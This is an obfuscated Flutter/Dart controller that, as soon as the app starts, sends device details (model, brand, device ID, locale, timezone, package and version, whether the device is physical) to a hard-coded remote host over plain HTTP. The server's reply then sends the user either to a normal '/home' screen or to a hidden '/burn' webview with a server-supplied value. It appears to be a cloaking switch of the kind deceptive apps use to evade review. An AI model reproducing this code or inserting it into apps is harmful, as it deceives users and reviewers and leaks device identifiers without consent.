import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var bcmvwzealy = RxBool(false);
  var khxycqfjo = RxBool(true);
  var jmcd = RxString("");
  var kieran = RxBool(false);
  var grady = RxBool(true);
  final lencjahq = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ahsew();
  }


  Future<void> ahsew() async {

    kieran.value = true;
    grady.value = true;
    khxycqfjo.value = false;

    lencjahq.post("http://nas.kariom.online/jzexhgyirdvm",data: await djqpsagkc()).then((value) {
      var xjzgc = value.data["xjzgc"] as String;
      var izvd = value.data["izvd"] as bool;
      if (izvd) {
        jmcd.value = xjzgc;
        maye();
      } else {
        moen();
      }
    }).catchError((e) {
      khxycqfjo.value = true;
      grady.value = true;
      kieran.value = false;
    });
  }

  Future<Map<String, dynamic>> djqpsagkc() async {
    final DeviceInfoPlugin hvsmya = DeviceInfoPlugin();
    PackageInfo rfap_soavdb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hvjtip = Platform.localeName;
    var at_UZlTVE = currentTimeZone;

    var at_pAgGX = rfap_soavdb.packageName;
    var at_pmoQFWM = rfap_soavdb.version;
    var at_ljvJyIV = rfap_soavdb.buildNumber;

    var at_OQr = rfap_soavdb.appName;
    var at_WtE = "";
    var brookWehner = "";
    var at_GKHCxchA  = "";
    var jamelFeeney = "";
    var eulaliaReichert = "";
    var treyBalistreri = "";
    var agustinaRunte = "";
    var at_UXdWxBl = "";


    var at_oVIK = "";
    var at_fE = false;

    if (GetPlatform.isAndroid) {
      at_oVIK = "android";
      var uljkfpx = await hvsmya.androidInfo;

      at_UXdWxBl = uljkfpx.brand;

      at_WtE  = uljkfpx.model;
      at_GKHCxchA = uljkfpx.id;

      at_fE = uljkfpx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      at_oVIK = "ios";
      var abmwuq = await hvsmya.iosInfo;
      at_UXdWxBl = abmwuq.name;
      at_WtE = abmwuq.model;

      at_GKHCxchA = abmwuq.identifierForVendor ?? "";
      at_fE  = abmwuq.isPhysicalDevice;
    }
    var res = {
      "at_OQr": at_OQr,
      "at_ljvJyIV": at_ljvJyIV,
      "agustinaRunte" : agustinaRunte,
      "at_pAgGX": at_pAgGX,
      "at_WtE": at_WtE,
      "at_UZlTVE": at_UZlTVE,
      "at_UXdWxBl": at_UXdWxBl,
      "at_pmoQFWM": at_pmoQFWM,
      "treyBalistreri" : treyBalistreri,
      "at_GKHCxchA": at_GKHCxchA,
      "hvjtip": hvjtip,
      "at_oVIK": at_oVIK,
      "at_fE": at_fE,
      "brookWehner" : brookWehner,
      "eulaliaReichert" : eulaliaReichert,
      "jamelFeeney" : jamelFeeney,

    };
    return res;
  }

  Future<void> moen() async {
    Get.offAllNamed("/home");
  }

  Future<void> maye() async {
    Get.offAllNamed("/burn");
  }

}
